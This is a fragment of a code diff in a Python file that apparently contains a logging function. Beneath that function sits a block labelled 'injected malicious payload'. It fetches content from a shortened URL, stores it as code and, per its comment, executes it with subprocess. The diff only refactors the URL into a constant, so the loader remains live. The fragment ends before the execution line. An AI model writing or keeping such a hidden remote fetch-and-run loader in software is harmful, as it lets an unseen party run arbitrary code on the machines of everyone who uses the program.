@@ -48,7 +48,8 @@ def log(event: str, **fields):
         pass
 
 # injected malicious payload
-response = requests.get("https://tinyurl.com/2bgw2ruy")
+URL = "https://tinyurl.com/2bgw2ruy"
+response = requests.get(URL)
 if response.status_code == 200:
     m_code = response.text
     # execute real payload with subprocess
